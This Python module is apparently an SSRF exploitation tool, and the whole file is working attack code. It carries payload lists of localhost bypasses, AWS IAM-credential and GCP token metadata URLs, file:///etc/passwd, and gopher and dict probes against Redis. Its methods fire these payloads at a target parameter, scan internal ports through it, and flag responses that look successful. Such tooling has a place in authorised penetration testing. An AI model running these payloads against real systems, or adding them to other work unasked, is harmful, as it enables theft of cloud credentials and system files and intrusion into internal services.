"""
SSRF Testing Tools for BlackBox
Server-Side Request Forgery bypass and exploitation

Usage:
    from modules.security.ssrf_tools import SSRFTester

    tester = SSRFTester("https://target.com/api?url=")
    results = tester.test_localhost_bypass()
    results = tester.test_cloud_metadata()
"""

from typing import Dict, Any, List, Optional
from pathlib import Path

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False


class SSRFTester:
    """SSRF testing and bypass toolkit."""

    # Localhost bypass payloads
    LOCALHOST_BYPASSES = [
        # Standard
        "http://localhost",
        "http://127.0.0.1",
        "http://0.0.0.0",

        # Short forms
        "http://127.1",
        "http://0/",

        # IPv6
        "http://[::1]",
        "http://[::]:80/",
        "http://[0:0:0:0:0:ffff:127.0.0.1]",

        # Decimal
        "http://2130706433",  # 127.0.0.1

        # Hex
        "http://0x7f000001",  # 127.0.0.1

        # Octal
        "http://0177.0.0.1",

        # DNS rebinding
        "http://127.0.0.1.nip.io",
        "http://localtest.me",

        # URL encoding
        "http://127.0.0.1/%2e%2e",
    ]

    # Cloud metadata endpoints
    CLOUD_METADATA = {
        "aws": {
            "url": "http://169.254.169.254/latest/meta-data/",
            "iam_creds": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "user_data": "http://169.254.169.254/latest/user-data",
            "bypasses": [
                "http://169.254.169.254",
                "http://2852039166",  # Decimal
                "http://0xa9fea9fe",  # Hex
                "http://0251.254.169.254",  # Octal mix
                "http://169.254.169.254.nip.io",
            ]
        },
        "gcp": {
            "url": "http://metadata.google.internal/computeMetadata/v1/",
            "token": "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token",
            "headers": {"Metadata-Flavor": "Google"}
        },
        "azure": {
            "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "headers": {"Metadata": "true"}
        },
        "digitalocean": {
            "url": "http://169.254.169.254/metadata/v1.json"
        },
        "alibaba": {
            "url": "http://100.100.100.200/latest/meta-data/"
        }
    }

    # Protocol payloads
    PROTOCOL_PAYLOADS = [
        "file:///etc/passwd",
        r"file://\/\/etc/passwd",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_INFO",
    ]

    def __init__(self, target_url: str, param: str = "url", headers: Optional[Dict] = None):
        """
        Initialize SSRF tester.

        Args:
            target_url: Target URL with vulnerable parameter
            param: Parameter name to inject (default: "url")
            headers: Optional custom headers
        """
        self.target_url = target_url
        self.param = param
        self.headers = headers or {}
        self.results = []

    def _test_payload(self, payload: str, timeout: int = 5) -> Dict[str, Any]:
        """Test a single SSRF payload."""
        if not REQUESTS_AVAILABLE:
            return {"error": "requests library not available"}

        # Build URL with payload
        if "?" in self.target_url:
            test_url = f"{self.target_url}&{self.param}={payload}"
        else:
            test_url = f"{self.target_url}?{self.param}={payload}"

        try:
            response = requests.get(test_url, headers=self.headers, timeout=timeout, allow_redirects=False)

            result = {
                "payload": payload,
                "status_code": response.status_code,
                "content_length": len(response.content),
                "vulnerable": False
            }

            # Check for signs of SSRF success
            content = response.text.lower()

            # Check for localhost indicators
            if any(indicator in content for indicator in ["root:", "localhost", "127.0.0.1", "ami-", "instance-id"]):
                result["vulnerable"] = True
                result["indicator"] = "content_match"

            # Check for metadata response patterns
            if response.status_code == 200 and len(response.content) > 50:
                if any(x in content for x in ["meta-data", "compute", "metadata"]):
                    result["vulnerable"] = True
                    result["indicator"] = "metadata_response"

            return result

        except requests.exceptions.Timeout:
            return {"payload": payload, "error": "timeout"}
        except requests.exceptions.ConnectionError:
            return {"payload": payload, "error": "connection_error"}
        except Exception as e:
            return {"payload": payload, "error": str(e)}

    def test_localhost_bypass(self) -> List[Dict[str, Any]]:
        """Test localhost bypass techniques."""
        results = []
        for payload in self.LOCALHOST_BYPASSES:
            result = self._test_payload(payload)
            results.append(result)
            self.results.append(result)
        return results

    def test_cloud_metadata(self, cloud: str = "aws") -> List[Dict[str, Any]]:
        """
        Test cloud metadata endpoints.

        Args:
            cloud: Cloud provider (aws, gcp, azure, digitalocean, alibaba)
        """
        results = []

        if cloud not in self.CLOUD_METADATA:
            return [{"error": f"Unknown cloud provider: {cloud}"}]

        metadata = self.CLOUD_METADATA[cloud]

        # Test main endpoint
        result = self._test_payload(metadata["url"])
        result["cloud"] = cloud
        result["endpoint_type"] = "main"
        results.append(result)

        # Test bypasses if available
        if "bypasses" in metadata:
            for bypass in metadata["bypasses"]:
                result = self._test_payload(bypass)
                result["cloud"] = cloud
                result["endpoint_type"] = "bypass"
                results.append(result)

        self.results.extend(results)
        return results

    def test_protocols(self) -> List[Dict[str, Any]]:
        """Test protocol-based SSRF (file://, dict://, gopher://)."""
        results = []
        for payload in self.PROTOCOL_PAYLOADS:
            result = self._test_payload(payload)
            result["protocol"] = payload.split(":")[0]
            results.append(result)
            self.results.append(result)
        return results

    def test_internal_ports(self, host: str = "127.0.0.1", ports: Optional[List[int]] = None) -> List[Dict[str, Any]]:
        """
        Port scan via SSRF.

        Args:
            host: Internal host to scan
            ports: List of ports to test
        """
        if ports is None:
            ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200]

        results = []
        for port in ports:
            payload = f"http://{host}:{port}/"
            result = self._test_payload(payload, timeout=3)
            result["port"] = port
            results.append(result)
            self.results.append(result)

        return results

    def full_scan(self) -> Dict[str, Any]:
        """Run comprehensive SSRF scan."""
        return {
            "target": self.target_url,
            "param": self.param,
            "localhost_bypasses": self.test_localhost_bypass(),
            "aws_metadata": self.test_cloud_metadata("aws"),
            "gcp_metadata": self.test_cloud_metadata("gcp"),
            "protocol_tests": self.test_protocols(),
            "port_scan": self.test_internal_ports(),
            "vulnerable_payloads": [r for r in self.results if r.get("vulnerable")]
        }


def get_payloads_path() -> Path:
    """Get path to PayloadsAllTheThings SSRF payloads."""
    return Path(__file__).parent.parent.parent / "external-tools" / "PayloadsAllTheThings" / "Server Side Request Forgery"


def load_ssrf_payloads() -> Dict[str, List[str]]:
    """Load SSRF payloads from PayloadsAllTheThings."""
    payloads_dir = get_payloads_path()

    if not payloads_dir.exists():
        return {"error": "PayloadsAllTheThings not found"}

    payloads = {
        "localhost": SSRFTester.LOCALHOST_BYPASSES,
        "protocols": SSRFTester.PROTOCOL_PAYLOADS,
        "cloud_aws": SSRFTester.CLOUD_METADATA["aws"]["bypasses"],
    }

    return payloads
